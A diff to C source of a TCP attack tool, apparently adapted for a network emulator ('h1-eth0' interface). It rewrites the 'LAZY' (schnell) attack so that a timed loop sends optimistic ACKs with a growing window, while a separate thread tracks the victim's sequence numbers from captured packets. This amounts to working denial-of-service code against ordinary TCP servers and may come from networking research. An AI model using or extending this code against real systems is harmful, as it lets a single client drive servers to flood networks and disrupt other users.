@@ -38,7 +38,7 @@ unsigned int victimIP;
 unsigned int localIP;
 char URL[BUFLEN]="";
 int MSS = 536;
-char * EtherDev =  "lo";
+char * EtherDev =  "h1-eth0";
 volatile unsigned int victimSequence;
 unsigned int localSequence;
 int AttackType=7;
@@ -211,11 +211,45 @@ int do_schnell2_attack(rawSock){
 	return 0;
 }
 
+
+static unsigned int window;
+void* packetGrabber0(void *arg) {
+	struct tcphdr *tcph;
+	const unsigned char * packet;
+	struct pcap_pkthdr pcap_hdr;
+    unsigned int vseq = 0;
+	int rawSock;
+
+	rawSock=*(int *)arg;
+	while(1){
+		packet = pcap_next(PcapHandle,&pcap_hdr);
+		if(packet==NULL)
+			continue;
+		tcph = (struct tcphdr*) (packet + 34);  // 14 + 20 = ethernet + ip hdrs
+		if(tcph->fin||tcph->rst)
+			gotFINorRST=1;
+
+        unsigned int new_vseq = ntohl(tcph->seq);
+        if (new_vseq <= vseq) {
+          victimSequence = new_vseq;
+          window = MSS;
+          printf("updating victim seqno...\n");
+        }
+        vseq = new_vseq;
+        printf("victim seqno: %ud\n", victimSequence);
+        fflush(stdout);
+	}
+	return NULL;
+}
+
+
+
 int do_schnell_attack(int rawSock){
 	int retries =0;
 	struct tcphdr *tcph;
 	const unsigned char * packet;
 	struct pcap_pkthdr pcap_hdr;
+    long usSendDelay = 1000000*(double)54/LocalBandwidth;	// how many microsecs between ACKs
 
 	do {
 		sendSYN(rawSock);
@@ -235,16 +269,29 @@ int do_schnell_attack(int rawSock){
 	printf("Doing LAZY attack (schnell1)\n");
 
 	/* Main loop */
+
+    pthread_t grabber;
+    pthread_create(&grabber,NULL,packetGrabber0,&rawSock);
 	while(1){
-		packet = pcap_next(PcapHandle,&pcap_hdr);
-		if(!packet)
-			continue;
-		tcph = (struct tcphdr*) (packet + 34);
-		victimSequence = ntohl(tcph->seq);
-		sendACK(rawSock);
-		if(tcph->fin||tcph->rst)
-			break;
+      myusSleep(usSendDelay);
+      if(gotFINorRST){
+        printf("GOT FIN or RST... exiting\n");
+        break;
+      }
+      sendACK(rawSock);
+      victimSequence += window;
+      window += MSS;
 	}
+
+	/* 	packet = pcap_next(PcapHandle,&pcap_hdr); */
+	/* 	if(!packet) */
+	/* 		continue; */
+	/* 	tcph = (struct tcphdr*) (packet + 34); */
+	/* 	victimSequence = ntohl(tcph->seq); */
+	/* 	sendACK(rawSock); */
+	/* 	if(tcph->fin||tcph->rst) */
+	/* 		break; */
+	/* } */
 
 	return 0;
 }
@@ -563,10 +610,25 @@ unsigned int getLocalIP(){
 	int err;
 	unsigned int ret;
 
-	assert(!gethostname(localFQHN,BUFLEN));
-	gethostbyname_r(localFQHN, &h, tmpbuf, BUFLEN, &hptr, &err);
-	assert(hptr != NULL);
-	memcpy(&ret, hptr->h_addr, sizeof(ret));
+	/* assert(!gethostname(localFQHN,BUFLEN)); */
+	/* gethostbyname_r(localFQHN, &h, tmpbuf, BUFLEN, &hptr, &err); */
+	/* assert(hptr != NULL); */
+	/* memcpy(&ret, hptr->h_addr, sizeof(ret)); */
+
+    struct ifaddrs *ifAddrStruct, *ifa;
+	getifaddrs(&ifAddrStruct);
+
+	for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
+	  if (ifa->ifa_addr->sa_family == AF_INET &&
+	      strstr(ifa->ifa_name,"eth0")) {
+	    strncpy(localFQHN,ifa->ifa_name,BUFLEN);
+	    localFQHN[BUFLEN-1]=0;
+	    memcpy(&ret, &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr,
+		   sizeof(ret));
+	    break;
+	  }
+	}
+
 	return ret;
 }
 
@@ -736,7 +798,7 @@ int ACK(int sock, unsigned int seq){
 	tcp->ack_seq = htonl(seq);
         tcp->doff = 5; // figure out options size
         tcp->ack = 1;
-        printf("window: %d\n", Window);
+        //printf("window: %d\n", Window);
         tcp->window = htons(Window);      // default window
 
 
